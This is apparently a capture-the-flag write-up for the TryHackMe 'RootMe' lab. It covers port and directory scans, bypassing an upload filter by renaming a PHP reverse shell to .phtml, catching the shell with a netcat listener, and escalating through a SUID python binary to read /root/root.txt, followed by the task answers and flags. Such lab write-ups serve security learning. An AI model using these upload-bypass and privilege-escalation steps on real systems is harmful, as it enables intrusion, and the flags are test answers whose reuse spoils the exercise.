Swatish Attaluri <br/>
Date: 01-06-2021
## Rootme - Tryhackme
### Machine IP: 10.10.207.95
#### Nmap scan
```bash
$ nmap -sV -sC -oN ports 10.10.207.95
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-01 12:58 IST
Nmap scan report for 10.10.207.95
Host is up (0.20s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.08 seconds
```
#### Gobuster
```bash
$ cat gobuster                       
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.207.95
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/01 12:59:34 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 314] [--> http://10.10.207.95/uploads/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.207.95/css/]    
/js                   (Status: 301) [Size: 309] [--> http://10.10.207.95/js/]     
/panel                (Status: 301) [Size: 312] [--> http://10.10.207.95/panel/]  
```
#### Gaining a reverse shell
```
/panel is to upload a file
uploading the php-reverse-shell.php says it does not accept php files.
rename it to .phtml and upload it
browse to http://10.10.207.95/uploads/php-reverse-shell.phtml use netcat to gain a reverse shell 
```

```bash
$ nc -lvnp 8888
$ cat user.txt
THM{y0u_g0t_a_sh3ll}
```
#### Privilege Escalation
Search for files with SUID bit can be done with
```bash
find /* -perm /4000 2>/dev/null       
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
```
Here python can be run with suid bit
Now, we need to read a file root.txt which can mostly be found at /root/root.txt
To read a file in python we have a script.
Reference: https://gtfobins.github.io/gtfobins/python/#file-read
```python
python -c 'print(open("file_to_read").read())'
```

```bash
$ /usr/bin/python
python -c 'print(open("/root/root.txt").read())'
THM{pr1v1l3g3_3sc4l4t10n}
```
#### Answers
```
##### Task 2:
Scan the machine, how many ports are open?
2

What version of Apache is running?
2.4.29

What service is running on port 22?
ssh

What is the hidden directory?
/panel/

##### Task 3:
user.txt
THM{y0u_g0t_a_sh3ll}

###### Task 4:
Search for files with SUID permission, which file is weird?
/usr/bin/python

root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```
#suid
#python